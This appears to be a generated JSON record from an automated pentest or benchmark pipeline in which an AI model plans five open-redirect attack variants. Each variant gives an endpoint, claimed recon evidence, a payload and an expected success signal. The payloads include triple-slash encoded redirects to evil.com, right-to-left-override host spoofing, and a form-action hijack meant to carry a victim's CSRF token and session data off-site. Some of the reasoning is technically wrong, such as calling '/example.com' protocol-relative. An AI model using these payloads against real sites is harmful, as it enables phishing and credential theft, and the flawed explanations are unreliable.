@@ -1,0 +1,68 @@
+{
+ "key": "open_redirect_4",
+ "model": "opencode/glm-5.3-flash-free",
+ "class": "open_redirect",
+ "variants": [
+  {
+   "endpoint": "GET /auth/post_login",
+   "target_param": "return",
+   "recon_evidence": "The post-login redirect handler rejects return values that omit the https scheme and rejects plain '..' path segments, but a single decode pass is observed on the Location header (a request to /auth/post_login?return=https:///app/%61 shows the once-decoded value echoed in the Location).",
+   "planner_rationale": "Triple-slash plus encoded dot segments re-form the attacker authority after the validator's single decode.",
+   "vuln_class": "open_redirect",
+   "payload": "https:///evil.com/%2e%2e",
+   "injection_point": "query",
+   "expected_success_signal": "302 Location header resolves to evil.com and the browser lands on the attacker host after login",
+   "confidence": 0.85,
+   "reasoning": "The validator's prefix and dot checks operate on the raw value while normalization happens later; the triple-slash form keeps the string scheme-shaped and the encoded dot-dot segment survives the single decode, normalizing to the attacker authority in the browser."
+  },
+  {
+   "endpoint": "GET /r/track_click",
+   "target_param": "dest",
+   "recon_evidence": "The click-tracking route forwards dest into its 302 after a check that the value starts with 'https:///' and contains no bare dot-dot sequence; encoded traversal was observed passing through untouched in a previous redirect cycle.",
+   "planner_rationale": "Encoded double-dot segments evade the literal-dot blacklist and normalize to the attacker host client-side.",
+   "vuln_class": "open_redirect",
+   "payload": "https:///evil.com/%2e%2e",
+   "injection_point": "query",
+   "expected_success_signal": "The tracking 302 chains to evil.com instead of returning to the in-app destination",
+   "confidence": 0.78,
+   "reasoning": "A literal substring blacklist for '..' does not catch the percent-encoded form, and the empty-authority triple-slash scheme lets the value pass the https prefix check while the browser resolves the trailing attacker authority."
+  },
+  {
+   "endpoint": "GET /link_check",
+   "target_param": "unsafe_link",
+   "recon_evidence": "The link-check interstitial renders the submitted host in its warning banner but accepts and passes through the URL unmodified when the hostname is displayed, and no bidirectional-character scrubbing was observed in the rendered response (same class of flaw as HackerOne report #635597).",
+   "planner_rationale": "Right-to-left-override makes the displayed host differ from the real one the continue button navigates to.",
+   "vuln_class": "open_redirect",
+   "payload": "unsafe_link=https%3A%2F%2F%E2%80%AEmoc.rettiwt",
+   "injection_point": "query",
+   "expected_success_signal": "Warning page shows a trusted-looking reversed host ('twitter.com' visually) while Continue resolves to the actual attacker-controlled hostname",
+   "confidence": 0.72,
+   "reasoning": "U+202E reverses the visual order of the following text, so the banner shows 'moc.rettiwt' flipped into a plausible domain while the browser resolves the true post-override hostname as the navigation target."
+  },
+  {
+   "endpoint": "GET /out",
+   "target_param": "unsafe_link",
+   "recon_evidence": "The outbound-link warning service echoes the target URL in its 'You are leaving' page without normalizing Unicode or stripping bidi control characters, so U+202E bytes in a prior test round-tripped through the page's HTML verbatim.",
+   "planner_rationale": "The RTLO character visually spoofs the host shown to the user, leaving the actual navigation target attacker-controlled.",
+   "vuln_class": "open_redirect",
+   "payload": "unsafe_link=https%3A%2F%2F%E2%80%AEmoc.rettiwt",
+   "injection_point": "query",
+   "expected_success_signal": "Interstitial displays a legitimate-appearing domain while the Proceed link's href navigates to the real punycode attacker host",
+   "confidence": 0.7,
+   "reasoning": "Since the page betrays no bidi filtering, an RTLO-prefixed host renders reversed and reads as a trusted domain, decoupling user perception from the hostname the browser actually resolves on continue."
+  },
+  {
+   "endpoint": "GET /social/invite",
+   "target_param": "recipient",
+   "recon_evidence": "The invite endpoint builds its confirm action from the recipient query value with no allowlist, and the rendered form's action carries the authenticity_token plus the session-bound hidden fields, mirroring the POST behavior documented in HackerOne report #49759.",
+   "planner_rationale": "Point the unvalidated confirm-action target at an external host so the authenticated POST follows with its CSRF token.",
+   "vuln_class": "open_redirect",
+   "payload": "recipient=/example.com",
+   "injection_point": "query",
+   "expected_success_signal": "Submitting the invite confirmation POSTs the victim's authenticity_token and session data to https://example.com",
+   "confidence": 0.85,
+   "reasoning": "The '/example.com' protocol-relative form resolves to the external host example.com, and because the redirect target becomes the form action, the victim's CSRF token and session credentials travel to the attacker alongside the POST."
+  }
+ ],
+ "raw_tail": "ion POSTs the victim's authenticity_token and session data to https://example.com\",\n    \"confidence\": 0.85,\n    \"reasoning\": \"The '/example.com' protocol-relative form resolves to the external host example.com, and because the redirect target becomes the form action, the victim's CSRF token and session credentials travel to the attacker alongside the POST.\"\n  }\n]\n\u001b[0m\n> build · glm-5.3-flash-free\n"
+}
